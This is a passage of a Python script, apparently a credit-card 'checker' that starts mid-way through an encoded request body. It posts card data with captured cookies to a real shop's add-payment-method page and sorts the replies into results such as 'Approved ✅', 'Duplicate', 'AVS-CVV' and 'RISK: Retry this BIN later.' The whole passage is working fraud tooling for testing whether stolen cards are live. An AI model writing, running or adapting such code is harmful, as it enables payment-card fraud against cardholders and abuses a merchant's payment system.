50L2FkZC1wYXltZW50LW1ldGhvZC8iLCJ0eXBvIjpbXSwiY29sbGVjdGluZ191c2VyX2FjdGl2aXR5X2RhdGEiOnsiY2xpY2tzIjoxfX0='),
]

	response = requests.post(
    'https://infinitediscsvipclub.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
	text = response.text
	
		
	pattern = r'Reason: (.+?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'added' in text or 'Payment method successfully added.' in text:
			result = "Approved ✅"
			return result
		else:
			try:
				result = text.split('Status code ')[1].split('<')[0]
			except:
				try:
					result = match
				except:
					result = 'Unknow Response'

	
	if 'risk_threshold' in result:
			return "RISK: Retry this BIN later."
	elif 'You cannot add a new payment method so soon after the previous one' in result:
		    return "Please wait for 20 seconds."
	elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in result:
		    return 'Approved ✅'
	elif 'Duplicate card exists in the vault.' in result:
		    return 'Approved ✅! - Duplicate'
	elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
		    return 'Approved ✅! - AVS-CVV'
	elif "Invalid postal code" in result or "CVV." in result:
		    return 'Approved ✅! - Invalid postal code and cvv'
	elif "Card Issuer Declined CVV" in result:
		    return 'Approved ✅! - Declined CVV'
	elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
		    return 'Approved ✅!'
	else:
		return result		